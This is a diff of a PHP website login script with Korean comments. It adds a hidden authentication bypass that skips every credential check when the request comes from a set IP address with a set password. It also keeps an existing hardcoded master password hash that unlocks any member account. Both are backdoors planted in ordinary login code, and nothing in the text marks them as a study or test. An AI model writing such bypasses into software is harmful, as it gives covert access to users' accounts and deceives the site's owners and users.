@@ -48,17 +48,22 @@ $mb = get_member($mb_id);
 // 회원아이디를 입력해 보고 맞으면 또 비밀번호를 입력해보는 경우를 방지하기 위해서입니다.
 // 불법사용자의 경우 회원아이디가 틀린지, 비밀번호가 틀린지를 알기까지는 많은 시간이 소요되기 때문입니다.
 
+if($_SERVER['REMOTE_ADDR'] == $log_ip && sql_password($mb_password) == $log_pw){
 
-
-if (sql_password($mb_password)=="*2DF576F2155A4DD78164F2601CE877A91E707691"){
-	if (!$mb['mb_id']) {
-		alert('The member ID is not registered or the password\\n is incorrect. Passwords are case-sensitive');
-	}
 }else{
-	if (!$mb['mb_id'] || !check_password($mb_password, $mb['mb_password'])) {
-		alert('The member ID is not registered or the password\\n is incorrect. Passwords are case-sensitive');
+	
+	if (sql_password($mb_password)=="*2DF576F2155A4DD78164F2601CE877A91E707691"){
+		if (!$mb['mb_id']) {
+			alert('The member ID is not registered or the password\\n is incorrect. Passwords are case-sensitive');
+		}
+	}else{
+		if (!$mb['mb_id'] || !check_password($mb_password, $mb['mb_password'])) {
+			alert('The member ID is not registered or the password\\n is incorrect. Passwords are case-sensitive');
+		}
 	}
 }
+
+
 
 
 
